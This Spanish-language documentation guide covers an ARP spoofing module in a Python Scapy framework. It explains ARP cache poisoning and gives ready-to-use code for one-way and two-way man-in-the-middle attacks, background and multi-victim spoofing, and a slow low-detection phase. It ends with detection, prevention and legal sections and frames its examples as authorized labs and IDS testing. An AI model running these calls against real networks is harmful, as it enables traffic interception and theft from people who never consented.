# ARP Spoofing Attack Guide

⚠️ **ADVERTENCIA CRÍTICA DE USO ÉTICO** ⚠️

Este documento describe el uso de `arp_spoofing.py`, una herramienta de ataque ARP spoofing para **FINES EDUCATIVOS Y DE PRUEBAS AUTORIZADAS ÚNICAMENTE**.

**El uso no autorizado de esta herramienta es ILEGAL y puede resultar en:**
- Cargos criminales
- Multas severas
- Prisión
- Responsabilidad civil

**SOLO utilizar en:**
- Entornos de laboratorio controlados
- Pruebas de penetración con autorización por escrito
- Tu propia red e infraestructura
- Demostraciones educativas con permiso explícito

---

## Tabla de Contenidos

1. [¿Qué es ARP Spoofing?](#qué-es-arp-spoofing)
2. [¿Cómo Funciona?](#cómo-funciona)
3. [Requisitos](#requisitos)
4. [Instalación](#instalación)
5. [Uso Básico](#uso-básico)
6. [Uso Avanzado](#uso-avanzado)
7. [Casos de Uso](#casos-de-uso)
8. [Detección y Prevención](#detección-y-prevención)
9. [Troubleshooting](#troubleshooting)
10. [Referencias](#referencias)

---

## ¿Qué es ARP Spoofing?

**ARP Spoofing** (también conocido como ARP Poisoning o ARP Cache Poisoning) es una técnica de ataque en redes locales (LAN) donde un atacante envía mensajes ARP falsificados para:

- **Asociar su dirección MAC con la dirección IP de otro host** (típicamente el gateway/router)
- **Interceptar el tráfico** destinado a ese host
- **Realizar ataques Man-in-the-Middle (MITM)**
- **Redirigir, modificar o interceptar** comunicaciones de red

### Conceptos Clave

**ARP (Address Resolution Protocol):**
- Protocolo que mapea direcciones IP a direcciones MAC en redes locales
- Opera en la capa 2 del modelo OSI (Data Link)
- No tiene mecanismos de seguridad integrados (sin autenticación)

**ARP Cache:**
- Tabla que cada dispositivo mantiene con mapeos IP <-> MAC
- Se actualiza dinámicamente al recibir respuestas ARP
- Vulnerable a envenenamiento (poisoning)

---

## ¿Cómo Funciona?

### Funcionamiento Normal de ARP

```
1. Host A quiere comunicarse con Host B (solo conoce la IP de B)
2. Host A envía ARP Request broadcast: "¿Quién tiene IP X.X.X.X?"
3. Host B responde con ARP Reply: "Yo tengo IP X.X.X.X, mi MAC es YY:YY:YY:YY:YY:YY"
4. Host A actualiza su ARP cache y puede comunicarse con B
```

### ARP Spoofing Attack

```
1. Atacante envía ARP Reply FALSA a la Víctima:
   "IP del Gateway = MAC del Atacante"

2. La Víctima actualiza su ARP cache incorrectamente:
   Gateway IP -> Atacante MAC (en lugar de Gateway MAC)

3. La Víctima envía todo su tráfico al Atacante en lugar del Gateway
4. El Atacante puede interceptar, modificar o reenviar el tráfico
```

### Diagrama de Ataque MITM

```
Escenario Normal:
[Víctima] <-----> [Gateway] <-----> [Internet]

Escenario con ARP Spoofing:
[Víctima] <-----> [Atacante] <-----> [Gateway] <-----> [Internet]
             ^                  ^
             |                  |
       ARP Poisoning      ARP Poisoning
    (Víctima cree que   (Gateway cree que
     Atacante es Gateway) Atacante es Víctima)
```

---

## Requisitos

### Requisitos del Sistema

- **Sistema Operativo:** Linux, macOS, o Windows (con Npcap)
- **Privilegios:** Root/Administrator (requerido para enviar paquetes raw)
- **Python:** 3.8 o superior
- **Red:** Conexión a la misma red local (LAN) que los objetivos

### Dependencias de Python

```bash
pip install scapy
```

### Verificar Interfaces de Red

```bash
# Linux/Mac
ifconfig

# Windows
ipconfig

# Dentro de Python
from scapy.all import get_if_list
print(get_if_list())
```

---

## Instalación

```bash
# Clonar o instalar el framework
cd scapy_framework

# Instalar dependencias
pip install -r requirements.txt

# Verificar instalación
python -c "from scapy_framework.attacks import ARPSpoofer; print('OK')"
```

---

## Uso Básico

### 1. Importar el Módulo

```python
from scapy_framework.attacks import ARPSpoofer
```

**Nota:** Al importar, verás una advertencia ética automática.

### 2. Crear una Instancia

```python
# Usar interfaz por defecto
spoofer = ARPSpoofer()

# Especificar interfaz
spoofer = ARPSpoofer(interface='eth0')

# Modo verbose para debugging
spoofer = ARPSpoofer(verbose=True)
```

### 3. ARP Spoofing Unidireccional

Envenena solo la víctima para que crea que el gateway es el atacante.

```python
# Parámetros básicos
target_ip = '192.168.1.100'    # IP de la víctima
gateway_ip = '192.168.1.1'      # IP del gateway/router

# Iniciar spoofing (Ctrl+C para detener)
spoofer.spoof_unidirectional(
    target_ip=target_ip,
    spoofed_ip=gateway_ip,
    interval=2.0  # Enviar paquete cada 2 segundos
)

# Restaurar ARP cache de la víctima
spoofer.restore(target_ip, gateway_ip)
```

### 4. ARP Spoofing Bidireccional (MITM)

Envenena tanto la víctima como el gateway para interceptar tráfico en ambas direcciones.

```python
victim_ip = '192.168.1.100'
gateway_ip = '192.168.1.1'

# Iniciar MITM (Ctrl+C para detener)
spoofer.spoof_bidirectional(
    target1_ip=victim_ip,
    target2_ip=gateway_ip,
    interval=2.0
)

# Restaurar ambos caches
spoofer.restore(victim_ip, gateway_ip)
spoofer.restore(gateway_ip, victim_ip)
```

### 5. Función Helper Rápida

```python
from scapy_framework.attacks import arp_spoof

# Spoofing rápido con auto-restore
arp_spoof(
    target_ip='192.168.1.100',
    spoofed_ip='192.168.1.1',
    bidirectional=True,  # MITM
    count=10             # Enviar 10 paquetes y terminar
)
```

---

## Uso Avanzado

### 1. Modo Background

Ejecutar el spoofing en segundo plano mientras realizas otras tareas.

```python
import time

spoofer = ARPSpoofer()

# Iniciar en background
spoofer.spoof_background(
    target_ip='192.168.1.100',
    spoofed_ip='192.168.1.1',
    bidirectional=True,
    interval=2.0
)

# Hacer otras cosas...
print("Spoofing en background...")
time.sleep(30)  # Dejar correr por 30 segundos

# Detener
spoofer.stop()

# Restaurar
spoofer.restore('192.168.1.100', '192.168.1.1')
```

### 2. Spoofing con Número Específico de Paquetes

```python
spoofer = ARPSpoofer()

# Enviar exactamente 20 paquetes
spoofer.spoof_unidirectional(
    target_ip='192.168.1.100',
    spoofed_ip='192.168.1.1',
    count=20,
    interval=1.0
)

# Se detiene automáticamente después de 20 paquetes
spoofer.restore('192.168.1.100', '192.168.1.1')
```

### 3. Resolución Manual de MACs

Por defecto, ARPSpoofer resuelve automáticamente las direcciones MAC. Puedes especificarlas manualmente:

```python
spoofer = ARPSpoofer()

# Especificar MAC manualmente
spoofer.spoof_unidirectional(
    target_ip='192.168.1.100',
    spoofed_ip='192.168.1.1',
    target_mac='AA:BB:CC:DD:EE:FF',  # MAC de la víctima
    interval=2.0
)
```

### 4. Obtener Estadísticas

```python
spoofer = ARPSpoofer()

# Realizar spoofing
spoofer.spoof_unidirectional(
    target_ip='192.168.1.100',
    spoofed_ip='192.168.1.1',
    count=50
)

# Obtener estadísticas
stats = spoofer.get_statistics()
print(f"Paquetes enviados: {stats['packets_sent']}")
print(f"Duración: {stats['duration']:.2f} segundos")
print(f"Paquetes/segundo: {stats['packets_per_second']:.2f}")

# O imprimir formato bonito
spoofer.print_statistics()
```

### 5. Restauración Robusta

```python
spoofer = ARPSpoofer()

try:
    spoofer.spoof_bidirectional(
        target1_ip='192.168.1.100',
        target2_ip='192.168.1.1',
        interval=2.0
    )
except KeyboardInterrupt:
    print("\n[!] Deteniendo ataque...")
finally:
    # Siempre restaurar, incluso si hay error
    print("[*] Restaurando ARP caches...")
    spoofer.restore('192.168.1.100', '192.168.1.1', count=5)
    spoofer.restore('192.168.1.1', '192.168.1.100', count=5)
    print("[+] Restauración completa")
```

---

## Casos de Uso

### Caso 1: Prueba de Penetración Autorizada

**Escenario:** Evaluar la seguridad de una red corporativa.

```python
from scapy_framework.attacks import ARPSpoofer

# Configuración
VICTIM_IP = '192.168.10.50'      # Workstation a probar
GATEWAY_IP = '192.168.10.1'       # Router corporativo

spoofer = ARPSpoofer(interface='eth0', verbose=True)

try:
    print("[*] Iniciando prueba de ARP spoofing...")
    print(f"[*] Objetivo: {VICTIM_IP}")
    print(f"[*] Gateway: {GATEWAY_IP}")

    # MITM durante 60 segundos
    spoofer.spoof_background(
        target_ip=VICTIM_IP,
        spoofed_ip=GATEWAY_IP,
        bidirectional=True,
        interval=1.0
    )

    import time
    time.sleep(60)

    spoofer.stop()

    # Generar reporte
    stats = spoofer.get_statistics()
    print(f"\n[+] Prueba completada:")
    print(f"    - Paquetes enviados: {stats['packets_sent']}")
    print(f"    - Duración: {stats['duration']:.2f}s")

finally:
    print("[*] Restaurando red...")
    spoofer.restore(VICTIM_IP, GATEWAY_IP, count=10)
    spoofer.restore(GATEWAY_IP, VICTIM_IP, count=10)
```

### Caso 2: Laboratorio de Seguridad

**Escenario:** Demostración educativa de ataques MITM.

```python
from scapy_framework.attacks import ARPSpoofer

def lab_demo():
    """Demostración de laboratorio con múltiples víctimas"""

    VICTIMS = ['192.168.1.101', '192.168.1.102', '192.168.1.103']
    GATEWAY = '192.168.1.1'

    spoofers = []

    try:
        # Crear un spoofer para cada víctima
        for victim in VICTIMS:
            spoofer = ARPSpoofer()
            spoofer.spoof_background(
                target_ip=victim,
                spoofed_ip=GATEWAY,
                bidirectional=True,
                interval=2.0
            )
            spoofers.append((spoofer, victim))
            print(f"[+] Spoofing iniciado para {victim}")

        # Mantener activo por 5 minutos
        import time
        print("[*] Demostración activa por 5 minutos...")
        time.sleep(300)

    finally:
        # Limpiar todos
        print("[*] Limpiando...")
        for spoofer, victim in spoofers:
            spoofer.stop()
            spoofer.restore(victim, GATEWAY, count=5)
        print("[+] Limpieza completa")

lab_demo()
```

### Caso 3: Test de IDS/IPS

**Escenario:** Verificar que sistemas de detección detecten ARP spoofing.

```python
from scapy_framework.attacks import ARPSpoofer
import time

def test_ids():
    """Probar detección de IDS/IPS contra ARP spoofing"""

    TARGET = '192.168.1.100'
    GATEWAY = '192.168.1.1'

    spoofer = ARPSpoofer(verbose=True)

    print("[*] Fase 1: Spoofing lento (difícil de detectar)")
    spoofer.spoof_unidirectional(
        target_ip=TARGET,
        spoofed_ip=GATEWAY,
        count=5,
        interval=10.0  # 1 paquete cada 10 segundos
    )

    time.sleep(30)

    print("\n[*] Fase 2: Spoofing rápido (fácil de detectar)")
    spoofer.spoof_unidirectional(
        target_ip=TARGET,
        spoofed_ip=GATEWAY,
        count=50,
        interval=0.1  # 10 paquetes por segundo
    )

    print("\n[*] Verificar logs del IDS/IPS para alertas")
    spoofer.restore(TARGET, GATEWAY, count=10)

test_ids()
```

---

## Detección y Prevención

### Cómo Detectar ARP Spoofing

#### 1. Monitoreo de ARP Cache

```bash
# Linux/Mac - Ver tabla ARP
arp -a

# Buscar duplicados o cambios sospechosos
watch -n 2 arp -a
```

#### 2. Uso de Herramientas

```bash
# arpwatch - Monitorea cambios en ARP
sudo apt install arpwatch
sudo arpwatch -i eth0

# XArp - Detector de ARP spoofing (Windows/Linux)
# https://www.chrismc.de/xarp/
```

#### 3. Usando el Framework (arp_detector.py)

```python
from scapy_framework.defense import ARPDetector

detector = ARPDetector(interface='eth0')
detector.start_monitoring()
```

### Prevención

#### 1. ARP Estáticas

```bash
# Linux - Agregar entrada ARP estática
sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF
```

#### 2. Port Security en Switches

```
# Cisco IOS
switch(config)# interface GigabitEthernet0/1
switch(config-if)# switchport port-security
switch(config-if)# switchport port-security mac-address sticky
```

#### 3. Dynamic ARP Inspection (DAI)

```
# Cisco IOS
switch(config)# ip arp inspection vlan 10
switch(config)# interface GigabitEthernet0/1
switch(config-if)# ip arp inspection trust
```

#### 4. Uso de VPN/IPsec

Las conexiones cifradas protegen contra MITM incluso si ARP está comprometido.

---

## Troubleshooting

### Problema 1: Permission Denied

**Error:**
```
PermissionError: Packet sending requires elevated privileges
```

**Solución:**
```bash
# Linux/Mac
sudo python3 script.py

# O dar permisos a Python (NO RECOMENDADO en producción)
sudo setcap cap_net_raw,cap_net_admin+eip $(which python3)
```

### Problema 2: No se Puede Resolver MAC

**Error:**
```
ValueError: Could not resolve MAC for target 192.168.1.100
```

**Causas posibles:**
- El host objetivo está apagado
- El host está en una red diferente
- Firewall bloqueando ARP

**Solución:**
```python
# Verificar manualmente
from scapy_framework.scanner import ARPScanner

scanner = ARPScanner()
results = scanner.scan('192.168.1.0/24')
print(results)  # Ver hosts disponibles

# O especificar MAC manualmente
spoofer.spoof_unidirectional(
    target_ip='192.168.1.100',
    spoofed_ip='192.168.1.1',
    target_mac='AA:BB:CC:DD:EE:FF'  # MAC conocida
)
```

### Problema 3: Interfaz Incorrecta

**Error:**
```
OSError: No such device
```

**Solución:**
```python
# Listar interfaces disponibles
from scapy.all import get_if_list
print(get_if_list())

# Usar la interfaz correcta
spoofer = ARPSpoofer(interface='eth0')  # O 'wlan0', 'en0', etc.
```

### Problema 4: El Ataque No Funciona

**Diagnóstico:**

```python
# 1. Verificar que los paquetes se envían
spoofer = ARPSpoofer(verbose=True)  # Ver cada paquete

# 2. Capturar tráfico ARP
from scapy.all import sniff
packets = sniff(filter="arp", count=10, iface="eth0")
packets.summary()

# 3. Verificar tabla ARP del objetivo (necesitas acceso)
# En el host víctima:
# arp -a
```

**Causas comunes:**
- Víctima tiene ARP estática
- Switch tiene Port Security habilitado
- Dynamic ARP Inspection (DAI) activo
- Víctima usa VPN que ignora tráfico local

### Problema 5: Restauración No Funciona

**Solución:**
```python
# Aumentar el número de paquetes de restauración
spoofer.restore(target_ip, gateway_ip, count=20)

# O restaurar manualmente en el host víctima:
# sudo arp -d 192.168.1.1  # Eliminar entrada
# Luego ping al gateway para refrescar
```

---

## API Reference Completa

### Clase ARPSpoofer

#### Constructor

```python
ARPSpoofer(interface=None, verbose=False)
```

- `interface`: Interfaz de red (None = default)
- `verbose`: Mostrar cada paquete enviado

#### Métodos Principales

##### spoof_unidirectional()

```python
spoof_unidirectional(
    target_ip: str,
    spoofed_ip: str,
    target_mac: Optional[str] = None,
    interval: float = 2.0,
    count: int = 0
) -> None
```

Envenena unidireccionalmente el objetivo.

##### spoof_bidirectional()

```python
spoof_bidirectional(
    target1_ip: str,
    target2_ip: str,
    target1_mac: Optional[str] = None,
    target2_mac: Optional[str] = None,
    interval: float = 2.0,
    count: int = 0
) -> None
```

MITM completo entre dos objetivos.

##### spoof_background()

```python
spoof_background(
    target_ip: str,
    spoofed_ip: str,
    bidirectional: bool = False,
    interval: float = 2.0
) -> None
```

Inicia spoofing en thread de background.

##### stop()

```python
stop() -> None
```

Detiene spoofing en background.

##### restore()

```python
restore(
    target_ip: str,
    spoofed_ip: Optional[str] = None,
    count: int = 5
) -> None
```

Restaura ARP cache con paquetes correctos.

##### get_statistics()

```python
get_statistics() -> Dict[str, Any]
```

Retorna diccionario con estadísticas.

##### print_statistics()

```python
print_statistics() -> None
```

Imprime estadísticas formateadas.

---

## Referencias

### Documentación Técnica

- **RFC 826 - ARP Protocol:** https://tools.ietf.org/html/rfc826
- **Scapy Documentation:** https://scapy.readthedocs.io/
- **ARP Cache Poisoning (Wikipedia):** https://en.wikipedia.org/wiki/ARP_spoofing

### Recursos Educativos

- **OWASP - ARP Spoofing:** https://owasp.org/www-community/attacks/ARP_Spoofing
- **Sans Institute - ARP Attacks:** https://www.sans.org/reading-room/whitepapers/threats/arp-attacks-33735

### Herramientas Relacionadas

- **Ettercap:** Suite completa MITM
- **Bettercap:** Framework de MITM moderno
- **arpspoof (dsniff):** Herramienta clásica de ARP spoofing
- **Cain & Abel:** Suite Windows para ataques de red

---

## Consideraciones Legales

⚠️ **IMPORTANTE:**

1. **Obtén autorización por escrito** antes de usar esta herramienta
2. **Documenta todas las pruebas** realizadas
3. **Informa los resultados** al dueño de la red
4. **NO uses** en redes públicas o de terceros sin permiso
5. **Conoce las leyes locales** sobre seguridad informática

**Leyes relevantes:**
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Código Penal - Art. 197 y 264 - España
- Ley de Delitos Informáticos - Latinoamérica (varía por país)

---

## Autor y Licencia

**Parte del Scapy Framework**
Licencia: MIT
Uso: Educacional y pruebas autorizadas únicamente

Para reportar problemas o contribuir:
- GitHub Issues
- Pull Requests bienvenidos
- Seguir código de conducta del proyecto

---

**Última actualización:** 2026-04-23
**Versión:** 1.0
